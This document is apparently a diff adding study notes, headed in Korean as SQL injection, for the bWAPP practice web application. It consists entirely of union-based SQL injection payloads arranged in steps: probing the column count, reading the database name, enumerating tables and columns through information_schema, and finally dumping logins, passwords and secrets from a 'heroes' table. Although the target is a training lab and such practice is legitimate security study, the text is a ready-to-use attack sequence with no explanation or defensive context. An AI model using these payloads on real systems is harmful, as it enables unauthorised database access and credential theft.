@@ -1,0 +1,54 @@
+ 6) SQL 인젝션
+
+ ① 
+
+' union select all 1 #
+' union select all 1,2 #
+' union select all 1,2,3 #
+' union select all 1,2,3,4 #
+
+
+ ② 
+
+' union select all 1,database(),3,4 #
+
+
+ ③ 
+
+' union select all 1,table_name,3,4 from information_schema.tables #
+' union select all 1,table_name,3,4 from information_schema.tables limit 0,1 #
+~
+' union select all 1,table_name,3,4 from information_schema.tables limit 17,1 #
+' union select all 1,table_name,3,4 from information_schema.tables limit 18,1 #
+' union select all 1,table_name,3,4 from information_schema.tables limit 19,1 #
+' union select all 1,table_name,3,4 from information_schema.tables limit 20,1 #
+' union select all 1,table_name,3,4 from information_schema.tables limit 21,1 #
+
+
+ ④ 
+
+' union select all 1,table_name,3,4 from information_schema.tables where table_schema="bWAPP" #
+' union select all 1,table_name,3,4 from information_schema.tables where table_schema="bWAPP" limit 0,1#
+' union select all 1,table_name,3,4 from information_schema.tables where table_schema="bWAPP" limit 1,1#
+' union select all 1,table_name,3,4 from information_schema.tables where table_schema="bWAPP" limit 2,1#
+' union select all 1,table_name,3,4 from information_schema.tables where table_schema="bWAPP" limit 3,1#
+' union select all 1,table_name,3,4 from information_schema.tables where table_schema="bWAPP" limit 4,1#
+
+
+ ⑤ 
+
+' union select all 1,table_name,3,column_name from information_schema.columns where table_name='heroes' limit 0,1 #
+' union select all 1,table_name,3,column_name from information_schema.columns where table_name='heroes' limit 1,1 #
+' union select all 1,table_name,3,column_name from information_schema.columns where table_name='heroes' limit 2,1 #
+' union select all 1,table_name,3,column_name from information_schema.columns where table_name='heroes' limit 3,1 #
+' union select all 1,table_name,3,column_name from information_schema.columns where table_name='heroes' limit 4,1 #
+
+
+ ⑥ 
+
+' union select all 1,concat(login,password),3,secret from heroes limit 0,1 #
+' union select all 1,concat(login,password),3,secret from heroes limit 1,1 #
+' union select all 1,concat(login,password),3,secret from heroes limit 2,1 #
+' union select all 1,concat(login,password),3,secret from heroes limit 3,1 #
+' union select all 1,concat(login,password),3,secret from heroes limit 4,1 #
+' union select all 1,concat(login,password),3,secret from heroes limit 5,1 #
